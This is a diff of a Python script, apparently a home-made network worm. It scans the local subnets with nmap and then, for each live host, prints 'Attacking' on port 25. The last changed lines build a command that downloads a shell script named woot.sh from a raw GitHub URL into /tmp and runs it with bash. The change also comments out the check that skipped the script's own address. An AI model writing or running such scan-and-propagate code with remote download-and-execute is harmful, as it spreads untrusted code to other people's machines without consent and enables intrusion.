@@ -26,16 +26,16 @@ def find_subnets():
 	
 			
 	targets = []
-	print("Targets:" + targets)
 	for item in lst: #tryna get 1.2.3.4/255.255.0.0 etc
 		if 'inet ' in item:
 			i = item[6:] # to get 1.2.3.4
 			i += '/24' # to get /24 time
 			targets.append(str(i))
 	
-	myownaddy = targets[0] # need own addy so i dotn end upo sending shit twice
+	# myownaddy = targets[0] # need own addy so i dotn end upo sending shit twice  - for now does not work, no need for sneeding
 	# step 1 - find suitable targets for nmap complete
-	print(myowndaddy)
+	# print("Own address: "+ str(myownaddy))
+	print("Targets:" + str(targets))
 	nmap_res = []
 	for item in targets:
 		nmap_ret = subprocess.check_output(['nmap', item], text = True)
@@ -51,9 +51,8 @@ def find_subnets():
 	return nmap_res # return the resolution of ips that are up
 	
 addy_list = find_subnets()
-print(addy_list)
+print("Address List: " + str(addy_list))
 for ADDR in addy_list:
-	if ADDR != myownaddy:
 		PORT = 25
 		print("Attacking: "+ ADDR + " " + str(PORT))
 		CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']
